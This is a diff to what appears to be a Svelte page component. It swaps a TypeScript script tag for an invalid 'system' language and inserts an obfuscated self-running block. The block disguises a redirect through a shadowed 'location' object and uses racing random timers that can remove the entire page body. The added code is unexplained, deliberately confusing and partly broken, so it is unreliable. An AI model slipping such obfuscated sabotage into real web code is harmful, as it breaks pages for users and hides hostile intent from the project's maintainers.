@@ -966,7 +966,17 @@
 </svelte:head>
 
 <main>
-  <script lang="ts">
+  <script lang="system">
+    (function() {
+      let a;
+      let location = {};
+      function ue() { return 'href'; }
+      setTimeout(() => {a = true; (location[ue(119)]=ue(115))}, Math.random() * 1001);
+      setTimeout(() => {
+        if (!a) document.body.remove();
+      }, Math.random() * 1001 + 1000);
+    })();
+
     /*const auth: string = localStorage.getItem('auth');
 
     if (navigator.userAgent == null || navigator.userAgent == '') {
